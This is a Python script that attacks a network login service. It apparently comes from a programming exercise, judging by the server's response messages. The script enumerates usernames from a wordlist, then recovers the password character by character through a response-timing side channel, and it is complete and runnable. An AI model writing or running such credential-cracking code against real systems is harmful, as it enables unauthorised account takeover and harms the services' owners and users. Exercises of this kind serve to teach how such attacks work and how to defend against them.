import itertools
import socket
import sys
import json
import string
import datetime
IP = sys.argv[1]
port = int(sys.argv[2])
new_socket = socket.socket()
adress = (IP, port)

new_socket.connect(adress)


file = open('logins.txt', 'r')
variables = string.ascii_letters + string.digits

def login():
    for line in file:
        char = line.replace('\n', '')
        yield char

log = login()



while True:
    Login = next(log)
    empty = ' '
    message = {'login': Login, 'password': empty}
    json_message = json.dumps(message)

    new_socket.send(json_message.encode())

    answer = new_socket.recv(4096)

    answer = answer.decode()
    anw = json.loads(answer)

    if anw['result'] == 'Wrong password!':
        correct_login = Login
        break
correct_password = ''
def password():
    result = itertools.product(variables, repeat=1)
    for prod in result:
        prod = ''.join(prod)
        yield prod

pasw = password()

while True:
    trypass = next(pasw)
    message = {'login': correct_login, 'password': correct_password + trypass}
    json_message = json.dumps(message)
    time_sent = datetime.datetime.now()
    new_socket.send(json_message.encode())
    answer = new_socket.recv(4096)
    time_receiv = datetime.datetime.now()
    answer = answer.decode()
    anw = json.loads(answer)
    difference = time_receiv - time_sent
    if difference.microseconds > 9000:
        correct_password += trypass
        pasw = password()
    if anw['result'] == 'Connection success!':
        print(json_message)
        sys.exit()


file.close()
new_socket.close()
